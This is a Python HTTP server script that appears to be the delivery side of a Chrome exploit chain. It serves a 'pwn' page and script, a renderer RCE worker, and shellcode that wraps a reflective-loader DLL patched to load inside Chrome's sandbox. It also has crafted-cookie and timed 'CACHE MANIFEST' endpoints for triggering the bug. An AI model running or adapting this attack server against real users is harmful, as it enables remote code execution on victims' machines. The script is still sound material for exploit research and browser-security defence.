#!/usr/bin/env python3
#
# This server should be run from Linux or WSL
import random
import time
import argparse
import struct
import os
import binascii
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn


class State:
    def reset(self):
        self.idx = -1
        self.completed = [0]*1000

state = State()


class Handler(BaseHTTPRequestHandler):
    def send_nocache(self):
        self.send_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.send_header("Pragma", "no-cache")
        self.send_header("Expires", "0")

    def header(self, code, extra = []):
        self.send_response(code)
        self.send_nocache()
        for k, v in extra:
            self.send_header(k, v)
        self.end_headers()
    
    def sendfile(self, fname, extra = []):
        self.header(200, extra)
        with open(fname, 'rb') as fd:
            self.wfile.write(fd.read())

    def do_GET(self):
        path = self.path

        if path == '/cookies':
            t0 = time.time()
            r = random.randrange(1000000)
            #prefix = 'y_%d'%r
            # 108: 7/10
            # 124 is decent, 0/1...
            # 140
            # 172 also pretty good
            size = 108
            prefix = 'y'*(size-2*7-1)
            prefix += '_%06d'%r
            assert len(prefix+'_%06d'%0) == size-1
            print('cookie random prefix = %s' % prefix)
            self.header(200, [
                ('Set-Cookie', '%s_%06d=foo'%(prefix,x)) for x in range(180)
                ])
            print('time: %.4f' % (time.time()-t0))
            return

        if path == '/':
            with open('pwn.html', 'rb') as f:
                page = f.read()
            if state.click:
                page += b'<button onclick="pwn();">pwn me please</button>'
            else:
                page += b'<script>pwn();</script>'
            self.header(200, [('Content-Type', 'text/html')])
            self.wfile.write(page)
            return

        if path == '/pwn.js':
            self.sendfile('sandbox/pwn.js', [('Content-Type', 'text/javascript')])
            return

        if path == '/renderer/rce_worker.js':
            self.sendfile('renderer/rce_worker.js')
            return

        if path == '/final_shellcode.bin':
            self.header(200, [('Content-Type', 'application/octet-stream')])
            self.wfile.write(b'\xcc' + b'\xbe\x20\x18'*100);
            return

        if path == '/shellcode.bin':
            with open('inject/payload/x64/Release/payload.dll', 'rb') as f:
                sc = f.read()

            import pefile
            pe = pefile.PE(data=sc)
            pe.parse_data_directories()
            va = None
            for entry in pe.DIRECTORY_ENTRY_EXPORT.symbols:
                if entry.name == b'ReflectiveLoader':
                    va = entry.address
            assert va != None, "Could not find ReflectiveLoader export"
            print('ReflectiveLoader virtual address = %x' % va)
            loader_offset = None
            for s in pe.sections:
                #print('  %20s %x-%x' % (s.Name.encode('utf-8'), s.VirtualAddress, s.VirtualAddress + s.SizeOfRawData))
                if s.VirtualAddress <= va < s.VirtualAddress + s.SizeOfRawData:
                    loader_offset = va - s.VirtualAddress + s.PointerToRawData
                    break
            assert loader_offset != None, "Could not find resolve ReflectiveLoader address"
            print('Loader offset: %x' % loader_offset)

            # Brutal hack because VCRUNTIME140.dll is not loaded in Chrome
            # and sandbox prevents it from being loaded.
            idx = sc.index(b'VCRUNTIME140.dll')
            fix = b'ntdll.dll\0\0'
            sc = sc[:idx] + fix + sc[idx+len(fix):]

            sc = b'\x48\x83\xe4\xf0\x50\xe9' + struct.pack('<I', loader_offset) + sc

            print('Shellcode size = %d bytes' % len(sc))
            self.header(200, [('Content-Type', 'application/octet-stream')])
            self.wfile.write(sc)
            return

        if path == '/reset':
            state.reset()
            self.header(200)
            return

        if path.startswith('/complete/'):
            parts = path.split('/')
            reqid, status = int(parts[-2]), int(parts[-1])
            state.completed[reqid] = max(state.completed[reqid], status)
            self.header(200)
            return

        if path == '/complete_all':
            state.completed = [2]*1000
            self.header(200)
            return

        if path.startswith('/trigger/'):
            id = int(path.split('/')[-1])

            state.idx += 1
            print('Request %d (%s): State 0' % (state.idx, path))

            while state.completed[state.idx] < 1:
                continue
            print('Request %d (%s): State 1' % (state.idx, path))
            
            # Send headers
            self.header(200)

            while state.completed[state.idx] < 2:
                continue

            print('Request %d (%s): State 2' % (state.idx, path))

            # Send body
            self.wfile.write(b"CACHE MANIFEST\n")
            return

        self.header(404)


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread
    https://stackoverflow.com/questions/14088294/multithreaded-web-server-in-python
    ."""

if __name__ == '__main__':
    p = argparse.ArgumentParser()
    p.add_argument('-l', dest='host', default='127.0.0.1')
    p.add_argument('-p', dest='port', default=8000, type=int)
    p.add_argument('--click', action='store_true')
    args = p.parse_args()

    state.click = args.click

    print('Serving on %s:%d' % (args.host, args.port))

    server = ThreadedHTTPServer((args.host, args.port), Handler)
    server.daemon_threads = True
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass